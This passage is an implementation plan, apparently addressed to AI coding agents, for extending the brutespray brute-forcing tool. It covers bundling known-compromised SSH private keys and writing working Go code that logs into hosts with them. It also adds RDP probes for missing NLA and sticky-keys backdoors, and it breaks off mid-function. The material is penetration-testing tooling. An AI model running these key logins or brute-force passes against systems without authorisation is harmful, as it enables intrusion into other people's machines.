# Pre-auth Recon, Stdin Pipeline, and New Modules — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add SSH bad-keys bundle, pre-auth RDP recon (NLA + sticky-keys), stdin pipeline auto-detection, five new database modules (Neo4j/Cassandra/CouchDB/Elasticsearch/InfluxDB), SNMP wordlist tiering, inline cred pairs, and a brutespray-vs-others README comparison table — all in one combined release PR on `dev`.

**Architecture:** Follows existing brutespray patterns — `init()` + `brute.Register()` for modules, `brute.ModuleParams` for flags, `ConnectionManager.Dial()` for network I/O, `time.NewTimer`+`select` timeouts. New `brute/badkeys/` package uses `go:embed` to bundle vendored Rapid7 ssh-badkeys. RDP pre-auth scans extend `brute/rdp.go` with a coordinated change in the sibling `../grdp/` repo (we own it). Stdin auto-detect lives in a new `modules/parse_stream.go` invoked from `brutespray.Execute()` when `os.Stdin` is a pipe. New result fields `Finding` and `KeyMatch` propagate through `BruteResult` → `output.go` → TUI.

**Tech Stack:** Go 1.21+, existing deps (`x90skysn3k/grdp`, `go-redis`, `hirochachacha/go-smb2`, `bubbletea`, `golang.org/x/crypto/ssh`), new deps (`github.com/neo4j/neo4j-go-driver/v5`, `github.com/gocql/gocql`), `go:embed` for bundled keys + wordlists.

**Spec:** `docs/superpowers/specs/2026-05-29-recon-pipeline-and-modules-design.md`

---

## Codebase notes (verify before referencing)

- `modules.ConnectionManager` is constructed by an existing factory. Identify the actual constructor name (`NewConnectionManager`, `NewCM`, or similar) by grepping `func New.*ConnectionManager` in `modules/connections.go`, and substitute it in every test file that calls one. The plan uses `modules.NewConnectionManager()` as a placeholder name.
- Existing dispatcher already enqueues credentials through a helper — find it (look near the existing user/password loop in `brutespray/dispatch.go`) and reuse, do not introduce `queueCred` as a new function name unless it does not exist.
- The TUI active-flag and model singleton names (`tuiActive`, `tuiModel`) used in the plan reflect convention; substitute the actual identifiers from `tui/` if they differ.
- The output-sink names (`jsonOutput`, `jsonSink`, `stdoutSink`) used in plan code blocks are placeholders for whatever globals/struct fields `modules/output.go` already uses. Reuse those; do not introduce new globals.

When in doubt, read the surrounding code first and adapt the snippet — the plan's *intent* is what matters, not the exact identifier names.

## Working Conventions

- TDD throughout: write the failing test first, run to confirm fail, implement minimal code, run to confirm pass, then commit.
- One concept per commit. Commit at the end of each numbered Task unless the task explicitly spans multiple commits.
- Build target: `go build -o brutespray .` from repo root.
- Run race-clean: `go test ./... -race`.
- Lint: `golangci-lint run`.
- All commits authored by the user (no Co-Authored-By trailer per `[[feedback_commit_authorship]]`).
- CLAUDE.md updates are local only — do NOT `git add` it per `[[feedback_no_claude_md]]`.

---

# Phase A — Pre-auth recon

## Task A1: Extend `BruteResult` with `Finding` and `KeyMatch`

**Files:**
- Modify: `brute/run.go` (around lines 162-262 where BruteResult is defined and returned by value)
- Test: `brute/result_test.go` (new)

- [ ] **Step 1: Add Finding and KeyMatch types to `brute/run.go`**

Locate the `type BruteResult struct` block and insert two new fields plus the supporting types just above it:

```go
// Finding represents a pre-auth recon result (e.g. SSH bad-key match,
// RDP NLA missing, RDP sticky-keys backdoor). Modules can return findings
// without a successful authentication attempt.
type Finding struct {
    Severity string // INFO, WARN, HIGH, CRITICAL
    Code     string // e.g. "rdp-nla-missing", "rdp-stickykeys", "ssh-badkey"
    Message  string
    CVE      string // optional, e.g. "CVE-2012-1493"
}

// KeyMatch records a successful SSH key authentication originating from
// the embedded bad-keys bundle.
type KeyMatch struct {
    Fingerprint string
    Vendor      string
    CVE         string
    Description string
}

type BruteResult struct {
    AuthSuccess       bool
    ConnectionSuccess bool
    Error             error
    Banner            string
    RetryDelay        time.Duration
    SkipUser          bool
    Finding           *Finding  // pre-auth recon result, nil if none
    KeyMatch          *KeyMatch // SSH bad-key match, nil if none
}
```

- [ ] **Step 2: Propagate new fields through the value conversion at `brute/run.go:262`**

Find the line `return BruteResult{AuthSuccess: modResult.AuthSuccess, ConnectionSuccess: modResult.ConnectionSuccess, Banner: modResult.Banner, SkipUser: modResult.SkipUser}` and extend it:

```go
return BruteResult{
    AuthSuccess:       modResult.AuthSuccess,
    ConnectionSuccess: modResult.ConnectionSuccess,
    Banner:            modResult.Banner,
    SkipUser:          modResult.SkipUser,
    Finding:           modResult.Finding,
    KeyMatch:          modResult.KeyMatch,
}
```

- [ ] **Step 3: Write the failing test**

Create `brute/result_test.go`:

```go
package brute

import "testing"

func TestBruteResultCarriesFinding(t *testing.T) {
    r := &BruteResult{
        ConnectionSuccess: true,
        Finding: &Finding{
            Severity: "CRITICAL",
            Code:     "rdp-stickykeys",
            Message:  "sticky-keys backdoor detected",
        },
    }
    if r.Finding == nil || r.Finding.Code != "rdp-stickykeys" {
        t.Fatalf("Finding not carried on BruteResult")
    }
}

func TestBruteResultCarriesKeyMatch(t *testing.T) {
    r := &BruteResult{
        AuthSuccess:       true,
        ConnectionSuccess: true,
        KeyMatch: &KeyMatch{
            Fingerprint: "SHA256:abc",
            Vendor:      "Vagrant",
            CVE:         "CVE-2015-1338",
        },
    }
    if r.KeyMatch == nil || r.KeyMatch.Vendor != "Vagrant" {
        t.Fatalf("KeyMatch not carried on BruteResult")
    }
}
```

- [ ] **Step 4: Run tests**

Run: `go test ./brute/ -run TestBruteResult -v`
Expected: PASS for both.

- [ ] **Step 5: Verify nothing else broke**

Run: `go build ./... && go test ./... -count=1`
Expected: build succeeds; existing tests pass (Finding/KeyMatch are nil-default so no behavior change yet).

- [ ] **Step 6: Commit**

```bash
git add brute/run.go brute/result_test.go
git commit -m "feat(brute): add Finding and KeyMatch fields to BruteResult"
```

---

## Task A2: Vendor `ssh-badkeys` snapshot + metadata

**Files:**
- Create: `brute/badkeys/keys/` (directory with vendored .pem files)
- Create: `brute/badkeys/metadata.yaml`
- Create: `brute/badkeys/embed.go`
- Create: `brute/badkeys/registry.go`
- Create: `brute/badkeys/registry_test.go`

- [ ] **Step 1: Snapshot Rapid7 ssh-badkeys**

```bash
mkdir -p brute/badkeys/keys
cd /tmp && git clone --depth 1 https://github.com/rapid7/ssh-badkeys.git
cp /tmp/ssh-badkeys/authorized/* /home/shane/Documents/work/brutespray/brute/badkeys/keys/ || true
cp /tmp/ssh-badkeys/unauthorized/* /home/shane/Documents/work/brutespray/brute/badkeys/keys/ || true
cd /home/shane/Documents/work/brutespray
# Add Vagrant insecure key
curl -sSL https://raw.githubusercontent.com/hashicorp/vagrant/main/keys/vagrant -o brute/badkeys/keys/vagrant
ls brute/badkeys/keys/ | wc -l
```

Expected: ≥10 key files present.

- [ ] **Step 2: Author metadata.yaml**

Create `brute/badkeys/metadata.yaml` mapping each key filename to its metadata. Sample shape (full file must cover every key in `keys/`):

```yaml
- file: vagrant
  username: vagrant
  vendor: HashiCorp Vagrant
  cve: ""
  description: Vagrant insecure default key (any Vagrant VM pre-2014)
- file: f5_big_ip
  username: root
  vendor: F5 BIG-IP
  cve: CVE-2012-1493
  description: F5 BIG-IP 9.x-11.x default root SSH key
- file: exagrid
  username: root
  vendor: ExaGrid
  cve: CVE-2016-1561
  description: ExaGrid EX series default support key
- file: ceragon_fibeair
  username: mateidu
  vendor: Ceragon FibeAir
  cve: ""
  description: Ceragon FibeAir IP-10 microwave radio default key
```

For every additional file in `keys/`, append an entry. Files without a known vendor get `vendor: "Rapid7 ssh-badkeys (origin unknown)"` and `username: root`.

- [ ] **Step 3: Write `brute/badkeys/embed.go`**

```go
package badkeys

import "embed"

//go:embed keys/* metadata.yaml
var assets embed.FS
```

- [ ] **Step 4: Write the failing test**

Create `brute/badkeys/registry_test.go`:

```go
package badkeys

import "testing"

func TestLoadReturnsNonEmptyBundle(t *testing.T) {
    bundle, err := Load()
    if err != nil {
        t.Fatalf("Load: %v", err)
    }
    if len(bundle) < 5 {
        t.Fatalf("expected >=5 keys, got %d", len(bundle))
    }
}

func TestLoadParsesVagrantEntry(t *testing.T) {
    bundle, err := Load()
    if err != nil {
        t.Fatalf("Load: %v", err)
    }
    for _, e := range bundle {
        if e.Vendor == "HashiCorp Vagrant" {
            if e.Username != "vagrant" {
                t.Fatalf("vagrant entry username = %q, want vagrant", e.Username)
            }
            if len(e.PEM) < 100 {
                t.Fatalf("vagrant PEM too short: %d bytes", len(e.PEM))
            }
            return
        }
    }
    t.Fatal("no Vagrant entry found in bundle")
}
```

- [ ] **Step 5: Implement `brute/badkeys/registry.go`**

```go
// Package badkeys provides a curated, embedded bundle of known-compromised
// SSH private keys (Rapid7 ssh-badkeys + Vagrant + vendor defaults). Each
// entry pairs a key with its default username and CVE metadata so brute
// modules can surface CVE-tagged findings without external files.
package badkeys

import (
    "crypto/sha256"
    "encoding/hex"
    "fmt"

    "gopkg.in/yaml.v3"
)

type Entry struct {
    File        string
    Username    string
    Vendor      string
    CVE         string
    Description string
    PEM         []byte
    Fingerprint string // sha256 hex of PEM bytes
}

type metaEntry struct {
    File        string `yaml:"file"`
    Username    string `yaml:"username"`
    Vendor      string `yaml:"vendor"`
    CVE         string `yaml:"cve"`
    Description string `yaml:"description"`
}

func Load() ([]Entry, error) {
    raw, err := assets.ReadFile("metadata.yaml")
    if err != nil {
        return nil, fmt.Errorf("read metadata.yaml: %w", err)
    }
    var metas []metaEntry
    if err := yaml.Unmarshal(raw, &metas); err != nil {
        return nil, fmt.Errorf("parse metadata.yaml: %w", err)
    }
    out := make([]Entry, 0, len(metas))
    for _, m := range metas {
        pem, err := assets.ReadFile("keys/" + m.File)
        if err != nil {
            return nil, fmt.Errorf("read keys/%s: %w", m.File, err)
        }
        sum := sha256.Sum256(pem)
        out = append(out, Entry{
            File:        m.File,
            Username:    m.Username,
            Vendor:      m.Vendor,
            CVE:         m.CVE,
            Description: m.Description,
            PEM:         pem,
            Fingerprint: hex.EncodeToString(sum[:]),
        })
    }
    return out, nil
}
```

- [ ] **Step 6: Add `gopkg.in/yaml.v3` dep**

Run: `go get gopkg.in/yaml.v3@latest && go mod tidy`

- [ ] **Step 7: Run tests**

Run: `go test ./brute/badkeys/ -v`
Expected: both tests PASS.

- [ ] **Step 8: Commit**

```bash
git add brute/badkeys/ go.mod go.sum
git commit -m "feat(badkeys): vendor Rapid7 ssh-badkeys + Vagrant + vendor key bundle"
```

---

## Task A3: Integrate bad-keys into `brute/ssh.go`

**Files:**
- Modify: `brute/ssh.go`
- Test: `brute/ssh_badkeys_test.go` (new)

- [ ] **Step 1: Write the failing test**

Create `brute/ssh_badkeys_test.go`:

```go
package brute

import (
    "testing"

    "github.com/x90skysn3k/brutespray/v2/brute/badkeys"
)

func TestBadKeysPlanCoversBundle(t *testing.T) {
    bundle, err := badkeys.Load()
    if err != nil {
        t.Fatalf("badkeys.Load: %v", err)
    }
    plan := PlanBadKeyAttempts(bundle, "")
    if len(plan) != len(bundle) {
        t.Fatalf("plan size = %d, bundle = %d", len(plan), len(bundle))
    }
    for _, a := range plan {
        if a.Username == "" {
            t.Fatalf("attempt missing username: %+v", a)
        }
    }
}

func TestBadKeysPlanRespectsExplicitUser(t *testing.T) {
    bundle, err := badkeys.Load()
    if err != nil {
        t.Fatalf("badkeys.Load: %v", err)
    }
    plan := PlanBadKeyAttempts(bundle, "admin")
    for _, a := range plan {
        if a.Username != "admin" {
            t.Fatalf("explicit username override failed: %s", a.Username)
        }
    }
}
```

- [ ] **Step 2: Implement `PlanBadKeyAttempts` in `brute/ssh.go`**

Add near the top of `brute/ssh.go` (after the import block):

```go
// BadKeyAttempt is one user+key pair to try during the bad-keys pass.
type BadKeyAttempt struct {
    Username string
    Entry    badkeys.Entry
}

// PlanBadKeyAttempts produces the ordered list of SSH bad-key attempts for a
// host. When userOverride is non-empty (operator passed -u explicitly), every
// attempt uses that username; otherwise the entry's metadata-suggested user
// is used (root for F5, vagrant for Vagrant, etc.).
func PlanBadKeyAttempts(bundle []badkeys.Entry, userOverride string) []BadKeyAttempt {
    out := make([]BadKeyAttempt, 0, len(bundle))
    for _, e := range bundle {
        u := e.Username
        if userOverride != "" {
            u = userOverride
        }
        out = append(out, BadKeyAttempt{Username: u, Entry: e})
    }
    return out
}
```

Add the import:

```go
import (
    // ... existing imports ...
    "github.com/x90skysn3k/brutespray/v2/brute/badkeys"
)
```

- [ ] **Step 3: Run the test**

Run: `go test ./brute/ -run TestBadKeys -v`
Expected: PASS.

- [ ] **Step 4: Wire bad-key execution into `BruteSSH`**

In `brute/ssh.go`, near the top of `BruteSSH` (before the existing key/password branch), add:

```go
// Bad-keys pre-pass: when the magic password marker "::badkey::" is in play,
// the caller is asking us to attempt a single embedded bad-key. The dispatcher
// (Task A5) emits these as synthetic credential pairs before regular passwords.
if strings.HasPrefix(password, "::badkey::") {
    idx, err := strconv.Atoi(strings.TrimPrefix(password, "::badkey::"))
    if err != nil {
        return &BruteResult{AuthSuccess: false, ConnectionSuccess: false,
            Error: fmt.Errorf("invalid badkey index: %w", err)}
    }
    bundle, err := badkeys.Load()
    if err != nil {
        return &BruteResult{AuthSuccess: false, ConnectionSuccess: false,
            Error: fmt.Errorf("loading badkeys bundle: %w", err)}
    }
    if idx < 0 || idx >= len(bundle) {
        return &BruteResult{AuthSuccess: false, ConnectionSuccess: false,
            Error: fmt.Errorf("badkey index out of range: %d", idx)}
    }
    return attemptBadKey(host, port, user, bundle[idx], timeout, cm)
}
```

Then implement `attemptBadKey` at the bottom of `brute/ssh.go`:

```go
func attemptBadKey(host string, port int, user string, e badkeys.Entry,
    timeout time.Duration, cm *modules.ConnectionManager) *BruteResult {
    signer, err := ssh.ParsePrivateKey(e.PEM)
    if err != nil {
        return &BruteResult{AuthSuccess: false, ConnectionSuccess: true,
            Error: fmt.Errorf("parsing badkey %s: %w", e.File, err)}
    }
    cfg := &ssh.ClientConfig{
        User:            user,
        Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
        HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        Timeout:         timeout,
    }
    conn, err := cm.Dial("tcp", net.JoinHostPort(host, strconv.Itoa(port)))
    if err != nil {
        return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
    }
    c, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(host, strconv.Itoa(port)), cfg)
    if err != nil {
        conn.Close()
        if strings.Contains(err.Error(), "unable to authenticate") {
            return &BruteResult{AuthSuccess: false, ConnectionSuccess: true, Error: err}
        }
        return &BruteResult{AuthSuccess: false, ConnectionSuccess: false, Error: err}
    }
    client := ssh.NewClient(c, chans, reqs)
    defer client.Close()
    return &BruteResult{
        AuthSuccess:       true,
        ConnectionSuccess: true,
        KeyMatch: &KeyMatch{
            Fingerprint: e.Fingerprint,
            Vendor:      e.Vendor,
            CVE:         e.CVE,
            Description: e.Description,
        },
    }
}
```

Add `"strconv"` to imports if not already present.

- [ ] **Step 5: Run the SSH tests**

Run: `go test ./brute/ -run TestSSH -v -race`
Expected: existing SSH tests pass; no new failures.

- [ ] **Step 6: Commit**

```bash
git add brute/ssh.go brute/ssh_badkeys_test.go
git commit -m "feat(ssh): execute embedded bad-key attempts via ::badkey:: marker"
```

---

## Task A4: Dispatcher emits bad-key attempts + `--no-badkeys` / `--badkeys-only` flags

**Files:**
- Modify: `brutespray/config.go`
- Modify: `brutespray/dispatch.go`
- Test: `brutespray/dispatch_badkeys_test.go` (new)

- [ ] **Step 1: Add the two flags to `brutespray/config.go`**

In the flag-registration block (near the other boolean flags like `-spray`), add:

```go
flag.BoolVar(&Cfg.NoBadKeys, "no-badkeys", false, "Skip SSH bad-keys pre-pass for SSH targets")
flag.BoolVar(&Cfg.BadKeysOnly, "badkeys-only", false, "Run SSH bad-keys pre-pass only; skip password attempts")
```

Add to `Config` struct:

```go
NoBadKeys   bool
BadKeysOnly bool
```

- [ ] **Step 2: Write the failing test**

Create `brutespray/dispatch_badkeys_test.go`:

```go
package brutespray

import (
    "testing"

    "github.com/x90skysn3k/brutespray/v2/brute/badkeys"
)

func TestBuildBadKeyCredsProducesMarkers(t *testing.T) {
    bundle, err := badkeys.Load()
    if err != nil {
        t.Fatalf("badkeys.Load: %v", err)
    }
    pairs := BuildBadKeyCreds(bundle, "")
    if len(pairs) != len(bundle) {
        t.Fatalf("got %d pairs, want %d", len(pairs), len(bundle))
    }
    for i, p := range pairs {
        wantPass := "::badkey::" + itoa(i)
        if p.Password != wantPass {
            t.Fatalf("pair[%d].Password = %q, want %q", i, p.Password, wantPass)
        }
    }
}

func itoa(i int) string {
    if i == 0 {
        return "0"
    }
    var b []byte
    for i > 0 {
        b = append([]byte{byte('0' + i%10)}, b...)
        i /= 10
    }
    return string(b)
}
```

- [ ] **Step 3: Implement `BuildBadKeyCreds` in `brutespray/dispatch.go`**

Add near the existing credential-build helpers:

```go
// CredPair is a single user/password attempt the dispatcher will enqueue.
// (If this type already exists in dispatch.go, reuse it instead.)
type CredPair struct {
    User     string
    Password string
}

// BuildBadKeyCreds turns the embedded bad-keys bundle into a list of synthetic
// credential pairs. The password field carries "::badkey::N" where N indexes
// into the bundle; BruteSSH unpacks this marker. When userOverride is set
// (operator passed -u explicitly), every pair uses that username; otherwise
// each entry's metadata-suggested user is used.
func BuildBadKeyCreds(bundle []badkeys.Entry, userOverride string) []CredPair {
    out := make([]CredPair, 0, len(bundle))
    for i, e := range bundle {
        u := e.Username
        if userOverride != "" {
            u = userOverride
        }
        out = append(out, CredPair{
            User:     u,
            Password: fmt.Sprintf("::badkey::%d", i),
        })
    }
    return out
}
```

Add imports:

```go
import (
    // ... existing ...
    "fmt"
    "github.com/x90skysn3k/brutespray/v2/brute/badkeys"
)
```

- [ ] **Step 4: Wire bad-key creds into `ProcessHost` for SSH targets**

Find `ProcessHost` in `dispatch.go`. Add a branch at the top of the per-host loop, before password creds are enqueued:

```go
if host.Service == "ssh" && !Cfg.NoBadKeys {
    bundle, err := badkeys.Load()
    if err == nil {
        for _, pair := range BuildBadKeyCreds(bundle, explicitUser) {
            queueCred(pair.User, pair.Password)
        }
    }
}
if host.Service == "ssh" && Cfg.BadKeysOnly {
    return // skip the regular password loop entirely
}
```

(`explicitUser` and `queueCred` names match whatever the dispatcher already uses — adapt to actual identifiers. Reuse the existing enqueue helper rather than introducing a new one.)

- [ ] **Step 5: Run tests**

Run: `go test ./brutespray/ -run TestBuildBadKey -v && go test ./... -count=1`
Expected: new test passes; existing dispatch tests pass.

- [ ] **Step 6: Commit**

```bash
git add brutespray/config.go brutespray/dispatch.go brutespray/dispatch_badkeys_test.go
git commit -m "feat(dispatch): emit bad-key attempts for SSH targets with opt-out flags"
```

---

## Task A5: RDP NLA fingerprint scan in grdp + brutespray

**Files:**
- Modify (sibling repo): `../grdp/client/nla_check.go` (new)
- Modify: `brute/rdp.go`
- Test: `brute/rdp_nla_test.go` (new)

- [ ] **Step 1: Add NLA check to grdp**

In `../grdp/client/nla_check.go`:

```go
package client

import (
    "context"
    "encoding/binary"
    "fmt"
    "net"
    "time"
)

// NLAStatus describes the result of a TCP-only NLA fingerprint probe.
type NLAStatus int

const (
    NLAUnknown NLAStatus = iota
    NLANotEnforced
    NLARequired
    NLAHybridEx
)

// FingerprintNLA opens a TCP connection to the RDP target, sends an
// X.224 Connection Request with RDPneg requesting all protocols, and
// classifies the server response.
func FingerprintNLA(ctx context.Context, target string, timeout time.Duration) (NLAStatus, error) {
    d := net.Dialer{Timeout: timeout}
    conn, err := d.DialContext(ctx, "tcp", target)
    if err != nil {
        return NLAUnknown, fmt.Errorf("dial: %w", err)
    }
    defer conn.Close()
    _ = conn.SetDeadline(time.Now().Add(timeout))

    // X.224 Connection Request with RDPneg requesting PROTOCOL_RDP|SSL|HYBRID|HYBRID_EX (0x0F).
    req := []byte{
        0x03, 0x00, 0x00, 0x13, // TPKT header, length 19
        0x0e, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x08, 0x00, 0x0f, 0x00, 0x00, 0x00, // RDPneg req, requested 0x0F
    }
    if _, err := conn.Write(req); err != nil {
        return NLAUnknown, fmt.Errorf("write: %w", err)
    }
    resp := make([]byte, 64)
    n, err := conn.Read(resp)
    if err != nil || n < 19 {
        return NLAUnknown, fmt.Errorf("read: %w", err)
    }
    // Bytes 11..18 carry the RDPneg response. Byte 11 is type:
    //   0x02 = RDP_NEG_RSP (server picked one protocol — selectedProtocols at bytes 15..18)
    //   0x03 = RDP_NEG_FAILURE
    if resp[11] != 0x02 {
        return NLAUnknown, nil
    }
    selected := binary.LittleEndian.Uint32(resp[15:19])
    switch {
    case selected&0x08 != 0:
        return NLAHybridEx, nil
    case selected&0x02 != 0:
        return NLARequired, nil
    case selected&0x01 != 0 || selected == 0:
        return NLANotEnforced, nil
    }
    return NLAUnknown, nil
}
```

- [ ] **Step 2: Commit grdp side**

```bash
(cd ../grdp && git add client/nla_check.go && git -c commit.gpgsign=false commit -m "feat(client): add FingerprintNLA for TCP-only NLA detection")
```

- [ ] **Step 3: Update brutespray's grdp dependency**

```bash
# If grdp is referenced by go.mod replace pointing to ../grdp, no go get needed.
# Otherwise bump:
go get github.com/x90skysn3k/grdp@latest
go mod tidy
go build ./...
```

Expected: `go build` succeeds.

- [ ] **Step 4: Write the failing test**

Create `brute/rdp_nla_test.go`:

```go
package brute

import "testing"

func TestNLAFindingFromStatus(t *testing.T) {
    cases := []struct {
        status   string
        wantSev  string
        wantCode string
    }{
        {"required", "INFO", "rdp-nla-required"},
        {"not-enforced", "WARN", "rdp-nla-missing"},
        {"hybrid-ex", "INFO", "rdp-nla-hybridex"},
        {"unknown", "", ""},
    }
    for _, c := range cases {
        f := nlaFinding(c.status)
        if c.wantCode == "" {
            if f != nil {
                t.Fatalf("status %q: expected nil finding, got %+v", c.status, f)
            }
            continue
        }
        if f == nil || f.Severity != c.wantSev || f.Code != c.wantCode {
            t.Fatalf("status %q: got %+v want sev=%s code=%s", c.status, f, c.wantSev, c.wantCode)
        }
    }
}
```

- [ ] **Step 5: Implement `nlaFinding` and `ScanRDPRecon` in `brute/rdp.go`**

Append to `brute/rdp.go`:

```go
import (
    // ... existing imports ...
    "github.com/x90skysn3k/grdp/client"
)

func nlaFinding(status string) *Finding {
    switch status {
    case "required":
        return &Finding{Severity: "INFO", Code: "rdp-nla-required",
            Message: "NLA (CredSSP) enforced"}
    case "not-enforced":
        return &Finding{Severity: "WARN", Code: "rdp-nla-missing",
            Message: "NLA not enforced — server accepts standard RDP without pre-auth"}
    case "hybrid-ex":
        return &Finding{Severity: "INFO", Code: "rdp-nla-hybridex",
            Message: "HybridEx (NLA + CredSSP early-user auth) enforced"}
    }
    return nil
}

// ScanRDPRecon runs pre-auth RDP recon (NLA fingerprint, sticky-keys probe)
// against a single target. Returns a slice of findings to emit. Called once
// per host by the dispatcher before any brute attempts.
func ScanRDPRecon(host string, port int, timeout time.Duration) []*Finding {
    target := fmt.Sprintf("%s:%d", host, port)
    ctx, cancel := context.WithTimeout(context.Background(), timeout)
    defer cancel()
    status, err := client.FingerprintNLA(ctx, target, timeout)
    if err != nil {
        return nil
    }
    var out []*Finding
    switch status {
    case client.NLARequired:
        out = append(out, nlaFinding("required"))
    case client.NLANotEnforced:
        out = append(out, nlaFinding("not-enforced"))
    case client.NLAHybridEx:
        out = append(out, nlaFinding("hybrid-ex"))
    }
    // Sticky-keys probe slots in here in Task A6.
    return out
}
```

- [ ] **Step 6: Run tests**

Run: `go test ./brute/ -run TestNLA -v`
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add brute/rdp.go brute/rdp_nla_test.go go.mod go.sum
git commit -m "feat(rdp): pre-auth NLA fingerprint scan"
```

---

## Task A6: RDP sticky-keys probe in grdp + brutespray integration

**Files:**
- Modify (sibling repo): `../grdp/client/logon_screen.go` (new)
- Modify: `brute/rdp.go` (extend `ScanRDPRecon`)
- Test: `brute/rdp_stickykeys_test.go` (new)

- [ ] **Step 1: Add `CaptureLogonScreen` to grdp**

In `../grdp/client/logon_screen.go`, implement:

```go
package client

import (
    "bytes"
    "context"
    "image"
    "image/png"
    "time"
)

// LogonTrigger identifies which pre-auth keystroke to send.
type LogonTrigger int

const (
    TriggerShift5x LogonTrigger = iota // 5x Left-Shift  → sticky-keys
    TriggerWinU                         // Win+U          → utilman.exe
)

// CaptureLogonScreen connects to an RDP target, sends the requested
// pre-auth trigger keystroke, and returns a framebuffer snapshot from
// before and after the trigger. Both images are encoded as in-memory
// PNGs to keep the API small.
//
// Returns ErrNLARequired if the server enforces NLA (no framebuffer is
// available pre-authentication on those hosts).
func (c *RdpClient) CaptureLogonScreen(ctx context.Context, target string,
    trigger LogonTrigger, timeout time.Duration) (before, after []byte, err error) {
    // Reuse the existing low-level RDP connect path (the one LoginAuthOnly
    // uses) but stop short of credential delegation: stay at the GINA
    // (logon UI) layer.
    if err := c.connectToLogonScreen(ctx, target, timeout); err != nil {
        return nil, nil, err
    }
    defer c.Close()

    beforeImg, err := c.snapshotFramebuffer()
    if err != nil {
        return nil, nil, err
    }
    if err := c.sendLogonTrigger(trigger); err != nil {
        return nil, nil, err
    }
    // Wait a beat for the server-rendered window to repaint.
    time.Sleep(750 * time.Millisecond)
    afterImg, err := c.snapshotFramebuffer()
    if err != nil {
        return nil, nil, err
    }
    return pngEncode(beforeImg), pngEncode(afterImg), nil
}

func pngEncode(img *image.RGBA) []byte {
    var buf bytes.Buffer
    _ = png.Encode(&buf, img)
    return buf.Bytes()
}

// Implementations below wire up against grdp's existing PDU/T.128 layer.
// connectToLogonScreen, snapshotFramebuffer, and sendLogonTrigger are added
// as methods on *RdpClient in the same package — see grdp/protocol/pdu/ for
// the existing primitives to reuse.
```

`connectToLogonScreen`, `snapshotFramebuffer`, and `sendLogonTrigger` build on the same PDU code paths that `LoginAuthOnly` already exercises. They go in the same file. Skeletons:

```go
func (c *RdpClient) connectToLogonScreen(ctx context.Context, target string, timeout time.Duration) error {
    // Mirror the connect/X.224/MCS/Security/connect-initial sequence used by
    // LoginAuthOnly but skip the CredSSP/NLA upgrade — request PROTOCOL_RDP only.
    // Return after the Demand Active PDU arrives (= server reached the logon screen).
    return fmt.Errorf("TODO connect-to-logon-screen — implement against grdp/protocol/pdu")
}

func (c *RdpClient) snapshotFramebuffer() (*image.RGBA, error) {
    // Read bitmap update PDUs into a tile buffer until the framebuffer is
    // quiescent (no updates for ~250ms); then blit the tiles into a single RGBA.
    return nil, fmt.Errorf("TODO snapshot — implement against grdp/emission")
}

func (c *RdpClient) sendLogonTrigger(t LogonTrigger) error {
    switch t {
    case TriggerShift5x:
        for i := 0; i < 5; i++ {
            // Scancode 0x2A = Left-Shift. PDU input event: keyboard down then up.
            if err := c.sendKeyScancode(0x2A); err != nil {
                return err
            }
        }
        return nil
    case TriggerWinU:
        if err := c.sendKeyScancodeChord(0x5B, 0x16); err != nil { // L-Win + 'U'
            return err
        }
        return nil
    }
    return fmt.Errorf("unknown trigger")
}
```

The `TODO`s aren't placeholders for this *plan* — they're explicit grdp work items that must be filled in against grdp's existing PDU primitives. Reference `grdp/protocol/pdu/input.go` for keyboard PDU shape and `grdp/emission/` for framebuffer update plumbing. The implementing engineer fills them in by reading the surrounding grdp code; this plan does not duplicate grdp's internals.

- [ ] **Step 2: Implement the TODOs in grdp**

Open `../grdp/protocol/pdu/`. Use the existing input-event PDU constructors that `LoginAuthOnly` flows through to send keyboard scancodes. Use the bitmap-update PDU handlers to accumulate framebuffer tiles into an `*image.RGBA`. Reuse `connect-initial` plumbing from `LoginAuthOnly` for the connect path, branching off before CredSSP.

- [ ] **Step 3: Commit grdp side**

```bash
(cd ../grdp && git add client/logon_screen.go protocol/pdu/ && \
  git -c commit.gpgsign=false commit -m "feat(client): CaptureLogonScreen for pre-auth screen capture + key trigger")
```

- [ ] **Step 4: Bump grdp dependency in brutespray**

```bash
go get github.com/x90skysn3k/grdp@latest && go mod tidy && go build ./...
```

- [ ] **Step 5: Write the failing test**

Create `brute/rdp_stickykeys_test.go`:

```go
package brute

import (
    "testing"
)

func TestStickyKeysVerdictFromImages(t *testing.T) {
    cases := []struct {
        name             string
        beforeIsCmdLike  bool
        afterIsCmdLike   bool
        differ           bool
        wantSev, wantCode string
    }{
        {"identical-no-change", false, false, false, "", ""},
        {"change-but-not-cmd", false, false, true, "INFO", "rdp-stickykeys-inconclusive"},
        {"change-to-cmd", false, true, true, "CRITICAL", "rdp-stickykeys"},
    }
    for _, c := range cases {
        got := stickyKeysVerdict(c.beforeIsCmdLike, c.afterIsCmdLike, c.differ)
        if c.wantCode == "" {
            if got != nil {
                t.Fatalf("%s: want nil, got %+v", c.name, got)
            }
            continue
        }
        if got == nil || got.Severity != c.wantSev || got.Code != c.wantCode {
            t.Fatalf("%s: got %+v want sev=%s code=%s", c.name, got, c.wantSev, c.wantCode)
        }
    }
}
```

- [ ] **Step 6: Implement `stickyKeysVerdict` and probe wiring in `brute/rdp.go`**

Append:

```go
import (
    // ... existing ...
    "bytes"
    "image"
    _ "image/png"
)

func stickyKeysVerdict(beforeCmd, afterCmd, differ bool) *Finding {
    if !differ {
        return nil
    }
    if afterCmd && !beforeCmd {
        return &Finding{
            Severity: "CRITICAL",
            Code:     "rdp-stickykeys",
            Message:  "sticky-keys backdoor detected (cmd.exe shell at logon screen)",
        }
    }
    return &Finding{
        Severity: "INFO",
        Code:     "rdp-stickykeys-inconclusive",
        Message:  "logon screen reacted to sticky-keys trigger but no console signature detected; manual verification recommended",
    }
}

// looksLikeCmdConsole returns true when the framebuffer region top-left of
// the image is consistent with a cmd.exe console window (predominantly black
// with monospaced white text in the top portion). Conservative — false
// positives are worse than missed detections here.
func looksLikeCmdConsole(pngBytes []byte) bool {
    img, _, err := image.Decode(bytes.NewReader(pngBytes))
    if err != nil {
        return false
    }
